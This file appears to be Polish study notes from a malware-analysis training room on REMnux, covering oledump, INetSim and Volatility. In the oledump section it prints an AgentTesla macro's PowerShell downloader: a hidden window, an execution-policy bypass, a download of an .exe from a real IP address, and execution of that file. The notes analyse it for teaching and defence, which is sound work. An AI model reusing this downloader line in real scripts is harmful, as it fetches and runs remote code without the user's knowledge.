@@ -1,0 +1,174 @@
+📌 REMnux – analiza złośliwego oprogramowania
+1️⃣ Czym jest REMnux?
+REMnux to specjalna dystrybucja Linuxa przeznaczona do:
+analizy malware
+analizy dokumentów z makrami
+analizy pamięci RAM
+symulowania sieci
+Zawiera gotowe narzędzia:
+Volatility
+YARA
+Wireshark
+oledump
+INetSim
+i wiele innych
+👉 To bezpieczne środowisko (sandbox) do badania podejrzanych plików.
+
+📂 Statyczna analiza dokumentu – oledump.py
+Co analizowaliśmy?
+Plik: agenttesla.xlsm
+To dokument Excel z makrami (.xlsm).
+
+🔎 Krok 1 – Sprawdzenie zawartości pliku
+oledump.py agenttesla.xlsm
+Wynik pokazuje tzw. data streams.
+Najważniejsze:
+A4: M 688 'VBA/ThisWorkbook'
+📌 Litera M oznacza, że w strumieniu jest Macro (VBA).
+
+🔎 Krok 2 – Wyciągnięcie konkretnego strumienia
+oledump.py agenttesla.xlsm -s 4
+-s = select (wybór strumienia)
+4 = numer strumienia (A4)
+Wynik jest w HEX → mało czytelny.
+
+🔎 Krok 3 – Dekompresja VBA
+oledump.py agenttesla.xlsm -s 4 --vbadecompress
+Teraz makro jest czytelne.
+🧠 Co robiło makro?
+Makro uruchamiało PowerShell:
+powershell -WindowStyle hidden -executionpolicy bypass;
+Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe"
+-OutFile $TempFile;
+Start-Process $TempFile;
+
+🔥 Co to oznacza?
+-WindowStyle hidden
+→ PowerShell działa w ukrytym oknie
+-executionpolicy bypass
+→ omija zabezpieczenia PowerShell
+Invoke-WebRequest
+→ pobiera plik z internetu
+Start-Process
+→ uruchamia pobrany plik
+
+📌 Podsumowanie ataku
+Po otwarciu dokumentu:
+Uruchamia się makro
+Makro odpala PowerShell
+PowerShell pobiera plik .exe
+Plik zostaje uruchomiony
+🎯 Typowa technika malware – downloader.
+🌐 INetSim – symulowanie fałszywej sieci
+INetSim pozwala symulować:
+HTTP
+HTTPS
+DNS
+FTP
+SMTP
+itd.
+Czyli tworzymy fałszywy internet dla malware.
+
+🔧 Konfiguracja
+1️⃣ Sprawdź IP maszyny:
+ifconfig
+2️⃣ Edytuj konfigurację:
+sudo nano /etc/inetsim/inetsim.conf
+Znajdź:
+#dns_default_ip 0.0.0.0
+Usuń # i wpisz IP maszyny.
+3️⃣ Uruchom:
+sudo inetsim
+Jeśli widzisz:
+Simulation running
+→ działa ✅
+🖥️ Test z AttackBox
+Z AttackBox:
+sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
+Pliki są FAKE – generowane przez INetSim.
+📄 Logi po zakończeniu
+Po zatrzymaniu INetSim:
+sudo cat /var/log/inetsim/report/report.X.txt
+Zobaczysz:
+metodę (GET)
+URL
+protokół
+jaki plik został „pobrany”
+📌 To symuluje zachowanie malware.
+
+🧠 Volatility 3 – analiza pamięci RAM
+Plik: wcry.mem
+Podstawowa składnia:
+vol3 -f wcry.mem windows.nazwapluginu
+Najważniejsze pluginy
+
+🌳 PsTree
+Pokazuje procesy w formie drzewa (rodzic → dziecko)
+windows.pstree.PsTree
+
+📋 PsList
+Lista aktywnych procesów
+windows.pslist.PsList
+
+💬 CmdLine
+Pokazuje argumenty uruchomienia procesów
+windows.cmdline.CmdLine
+
+📁 FileScan
+Skanuje obiekty plików w pamięci
+windows.filescan.FileScan
+
+📚 DllList
+Lista załadowanych bibliotek DLL
+windows.dlllist.DllList
+
+🔍 PsScan
+Wyszukuje procesy (nawet ukryte)
+windows.psscan.PsScan
+
+💀 Malfind
+Wykrywa możliwy wstrzyknięty kod (code injection)
+windows.malfind.Malfind
+
+🔁 Automatyzacja – preprocessing
+Zamiast ręcznie uruchamiać pluginy:
+for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
+
+📌 Co robi?
+Tworzy pętlę
+Uruchamia każdy plugin
+Zapisuje wynik do osobnego pliku .txt
+To jest profesjonalna praktyka forensic.
+
+🔤 Preprocessing za pomocą strings
+strings wcry.mem > wcry.strings.ascii.txt
+strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
+strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
+
+Opcje:
+-e l → Unicode little endian
+-e b → Unicode big endian
+
+📌 Po co?
+Aby łatwiej wyszukiwać:
+adresy IP
+domeny
+hasła
+ścieżki plików
+
+🎯 Co zapamiętać z całego rooma?
+✔ REMnux = gotowe środowisko do malware analysis
+✔ oledump → analiza dokumentów z makrami
+✔ Makra często uruchamiają PowerShell downloader
+✔ INetSim → symuluje internet dla malware
+✔ Volatility → analiza pamięci RAM
+✔ Strings → szybkie wydobywanie tekstu z pamięci
+✔ Preprocessing = zapis wyników do plików
+
+💀 Najważniejsza lekcja praktyczna
+Threat actorzy:
+używają makr
+ukrywają PowerShell
+omijają execution policy
+pobierają drugi payload
+często stosują wieloetapowy atak
